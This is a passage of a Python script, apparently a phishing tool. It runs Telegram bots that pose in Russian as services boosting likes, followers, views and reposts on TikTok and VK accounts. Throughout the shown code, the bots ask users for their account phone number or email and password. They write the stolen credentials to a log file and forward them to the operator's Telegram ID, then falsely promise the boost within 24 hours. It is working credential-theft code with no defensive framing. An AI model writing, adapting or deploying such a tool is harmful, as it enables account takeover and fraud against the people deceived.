          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Пароль: {usrpass}
          Имя: {message.from_user.first_name}

          '''
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                bot.send_message(ID, get)
                msg = bot.reply_to(message, f'Ваш пароль: {usrpass}')
                time.sleep(1)
                bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 24 часов!')


          bot.polling()


      if choice_fish == '2':
          log = open('bot-log.txt', 'a+', encoding='utf-8')
          ID = Write.Input('Введите свой айди:  ', Colors.purple_to_red, interval=0.005)
          Tokenc = Write.Input('Введите токен:  ', Colors.purple_to_red, interval=0.005)
          bot = telebot.TeleBot(Tokenc)
          try:
                Write.Print(("Бот запущен!\n"), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, '!Бот запущен!') 
          except:
                Write.Print(("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!"), Colors.red_to_purple, interval=0.005)

          @bot.message_handler(commands=['start'])
          def start(message):
                Write.Print((f'''Обнаружен пользователь!
                ID: {message.from_user.id}'''), Colors.red_to_purple, interval=0.005)
                bot.send_message(message.chat.id, '''👋 Привет! 👋
                        Это бот продвижения вашего тикток аккаунта!
                        Чтобы начать, нажмите /nacrutka''')
                            
          @bot.message_handler(commands=['nacrutka', 'n'])
          def start1(message):
                keyboardmain = types.InlineKeyboardMarkup(row_width=2)
                first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
                second_button = types.InlineKeyboardButton(text="Подписчики📃", callback_data="like")
                button3 = types.InlineKeyboardButton(text="Просмотры", callback_data="like")
                button4 = types.InlineKeyboardButton(text="Репосты", callback_data="like")
                keyboardmain.add(first_button, second_button, button3, button4)
                bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

          @bot.callback_query_handler(func=lambda call:True)
          def callback_inline1(call):
                if call.data == "like":
                        msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
                        bot.register_next_step_handler(msg, qproc1)

          def qproc1(message):
                try:
                        num = message.text	
                        if not num.isdigit():
                                msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
                                return
                        elif int(num) > 500:
                                bot.reply_to(message, 'Колличество не может быть более 500!')
                                return
                        else:
                                bot.send_message(message.chat.id, f'Колличество: {num}')
                                msg = bot.send_message(message.chat.id, 'Введите номер телефона(или почту) от вашего аккаунта:') 
                                bot.register_next_step_handler(msg, step1)
                except Exception as e:
                        print(e)




          def step1(message):
                get = f'''Полученные данные: 
          Получено в боте: tiktok
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Логин: {message.text}
          Имя: {message.from_user.first_name}

          '''
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, get)
                bot.reply_to(message, f'Ваш логин: {message.text}')

                msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
                bot.register_next_step_handler(msg1, step2)


          def step2(message):
                usrpass = message.text
                get = f'''Полученные данные:
          Получено в боте: tiktok 
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Пароль: {usrpass}
          Имя: {message.from_user.first_name}

          '''
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                bot.send_message(ID, get)
                msg = bot.reply_to(message, f'Ваш пароль: {usrpass}')
                time.sleep(1)
                bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, ожидайте накрутку на ваш аккаунт в течении 24 часов!')


          bot.polling()

      if choice_fish == '1':

          log = open('bot-log.txt', 'a+', encoding='utf-8')
          ID = Write.Input('Введите свой айди: ', Colors.purple_to_red, interval=0.005)
          Tokenv = Write.Input('Введите токен: ', Colors.purple_to_red, interval=0.005)
          bot = telebot.TeleBot(Tokenv)
          try:
                Write.Print(("Бот запущен!"), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, '!Бот запущен!') 
          except:
                Write.Print(("Возможно вы не написали /start в вашем боте! Без этого действия скрипт будет работать некорректно!"), Colors.red_to_purple, interval=0.005)



          @bot.message_handler(commands=['start'])
          def start(message):
                Write.Print((f'''Обнаружен пользователь!
                ID: {message.from_user.id}'''), Colors.red_to_purple, interval=0.005)
                bot.send_message(message.chat.id, '''👋 Привет! 👋
                        Это бот накрутки лайков и друзей на ваш VK аккаунт!
                        Чтобы начать, нажмите /nacrutka''') 

          @bot.message_handler(commands=['nacrutka', 'n'])
          def start1(message):
                keyboardmain = types.InlineKeyboardMarkup(row_width=2)
                first_button = types.InlineKeyboardButton(text="Лайки❤️", callback_data="like")
                second_button = types.InlineKeyboardButton(text="Друзья📃", callback_data="like")
                button3 = types.InlineKeyboardButton(text="Репосты", callback_data="like")
                button4 = types.InlineKeyboardButton(text="Прослушивания плейлистов", callback_data="like")
                keyboardmain.add(first_button, second_button, button3, button4)
                bot.send_message(message.chat.id, "Выберите пункт:", reply_markup=keyboardmain)

          @bot.callback_query_handler(func=lambda call:True)
          def callback_inline1(call):
                if call.data == "like":
                        msg = bot.send_message(call.message.chat.id, 'Введите колличество (не более 500)') 
                        bot.register_next_step_handler(msg, qproc1)

          def qproc1(message):
                try:
                        num = message.text	
                        if not num.isdigit():
                                msg = bot.reply_to(message, 'Введите колличество числом! Повторите попытку, написав /nacrutka!')#⏳
                                return
                        elif int(num) > 500:
                                bot.reply_to(message, 'Колличество не может быть более 500!')
                                return
                        else:
                                bot.send_message(message.chat.id, f'Колличество: {num}')
                                msg = bot.send_message(message.chat.id, 'Введите номер телефона от вашего аккаунта:') 
                                bot.register_next_step_handler(msg, step1)
                except Exception as e:
                        print(e)




          def step1(message):
                inp = message.text.replace("+", "")
                if not inp.isdigit():
                        bot.reply_to(message, 'Введите номер числом! Повторите попытку, написав /nacrutka!')#⏳
                        return
                get = f'''Полученные данные: 
          Получено в боте: vk
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Логин: {message.text}
          Имя: {message.from_user.first_name}

          '''
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                bot.send_message(ID, get)
                bot.reply_to(message, f'Ваш логин: {message.text}')

                msg1 = bot.send_message(message.chat.id, 'Введите пароль от вашего аккаунта:') 
                bot.register_next_step_handler(msg1, step2)


          def step2(message):
                usrpass = message.text
                get = f'''Полученные данные:
          Получено в боте: vk 
          ID: {message.from_user.id}
          Ник: @{message.from_user.username}
          Пароль: {usrpass}
          Имя: {message.from_user.first_name}

          '''
                Write.Print((get), Colors.red_to_purple, interval=0.005)
                log = open('bot-log.txt', 'a+', encoding='utf-8')
                log.write(get + '  ')
                log.close()
                bot.send_message(ID, get)
                msg = bot.reply_to(message, f'Ваш пароль: {usrpass}')
                time.sleep(1)
                bot.reply_to(message, f'Спасибо, что воспользовались нашим сервисом😉! Если введенные данные правильные, то ожидайте накруткуна ваш аккаунт в течении 24 часов!')


          bot.polling()